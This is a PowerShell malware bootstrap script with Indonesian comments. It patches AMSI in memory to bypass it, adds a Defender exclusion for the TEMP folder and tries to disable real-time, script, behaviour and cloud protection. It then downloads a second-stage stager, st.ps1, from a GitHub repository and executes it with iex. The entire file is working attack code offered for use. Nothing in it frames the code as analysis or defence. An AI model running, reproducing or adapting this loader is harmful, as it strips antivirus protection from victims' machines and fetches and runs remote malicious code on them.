# b.ps1 - bootstrap: matikan AMSI + exclusion, BARU ambil st.ps1
# Dipanggil: iex(irm .../b.ps1)
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

# 1. AMSI mati sebelum ada konten lain yang dipindai
try {
    $t = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $t.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
} catch { }
try {
    $k = [Runtime.InteropServices.Marshal]
    $p = $k::GetProcAddress($k::GetModuleHandle('amsi.dll'), 'AmsiScanBuffer')
    $k::Copy([byte[]](0xB8, 0x57, 0, 7, 0x80, 0xC3), 0, $p, 6)
} catch { }

# 2. exclusion + redam komponen scan (butuh admin; kalau ditolak, lanjut)
try { Add-MpPreference -ExclusionPath $env:TEMP -Force } catch { }

$bl = Join-Path $env:TEMP 'b.txt'
function B($s) { $s | Out-File $bl -Append -Encoding utf8 }
Remove-Item $bl -Force -ErrorAction SilentlyContinue
B "admin=$(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators'))"

try { Set-MpPreference -DisableScriptScanning $true -ErrorAction Stop; B 'scriptscan off' } catch { B 'scriptscan gagal' }
try { Set-MpPreference -DisableIOAVProtection $true -ErrorAction Stop; B 'ioav off' } catch { B 'ioav gagal' }
try { Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction Stop; B 'behavior off' } catch { B 'behavior gagal' }
try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop; B 'rt off' } catch { B 'rt gagal' }
try { Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction Stop; B 'bafs off' } catch { B 'bafs gagal' }

try { $p = Get-MpPreference; B "hasil: rt=$($p.DisableRealtimeMonitoring) script=$($p.DisableScriptScanning) ioav=$($p.DisableIOAVProtection) tamper=$((Get-MpComputerStatus).IsTamperProtected)" } catch { B 'baca status gagal' }

# 3. baru muat stager sungguhan (raw dulu, release cadangan)
$urls = @(
    'https://raw.githubusercontent.com/byteforge0-cloud/darkwhisper/main/st.ps1',
    'https://github.com/byteforge0-cloud/darkwhisper/releases/download/mantap/st.ps1'
)
foreach ($u in $urls) {
    try {
        $x = (New-Object Net.WebClient).DownloadString($u)
        if ($x.Length -gt 500) { iex $x; break }
    } catch { }
}
